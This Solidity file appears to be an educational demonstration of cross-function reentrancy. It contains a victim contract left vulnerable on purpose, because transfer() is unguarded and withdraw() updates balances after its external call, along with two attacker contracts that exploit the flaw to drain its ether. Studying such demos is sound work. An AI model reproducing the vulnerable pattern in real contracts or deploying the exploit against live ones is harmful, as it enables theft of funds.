// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract ReentrancyGuard {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;

    uint256 private _status;

    error ReentrancyGuardReentrantCall();

    constructor() {
        _status = NOT_ENTERED;
    }

    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be NOT_ENTERED
        if (_status == ENTERED) {
            revert ReentrancyGuardReentrantCall();
        }

        // Any calls to nonReentrant after this point will fail
        _status = ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == ENTERED;
    }
}

contract cross_function_reentrancy is ReentrancyGuard {
    mapping (address => uint) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address to, uint amount) public {
        if (balances[msg.sender] >= amount) {
            balances[to] += amount;
            balances[msg.sender] -= amount;
        }
    }

    function withdraw() public nonReentrant { // we can use noReentrant here.
        uint amount = balances[msg.sender];
        msg.sender.call{value: amount}("");
        balances[msg.sender] = 0;
    }
}

contract attack_cross_function_reentrancy {
    cross_function_reentrancy victim;
    uint256 amount = 1 ether;

    attack2_cross_function_reentrancy public attacker2;

    constructor(cross_function_reentrancy _victim) {
        victim = cross_function_reentrancy(_victim);
    }

    function setattacker2(address _attacker2) public {
        attacker2 = attack2_cross_function_reentrancy(_attacker2);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        while(address(victim).balance >= amount) {
            victim.withdraw();
            attacker2.send(msg.value, address(this));
        }
    }

    receive() external payable {
        victim.transfer(address(attacker2), msg.value);
    }
}


contract attack2_cross_function_reentrancy {

 
    uint256 amount = 1 ether;
    cross_function_reentrancy victim;

    constructor(cross_function_reentrancy _victim) {
        victim = cross_function_reentrancy(_victim);
    }

    function send(uint256 value, address attacker) public {
        victim.transfer(attacker, value);
    }

}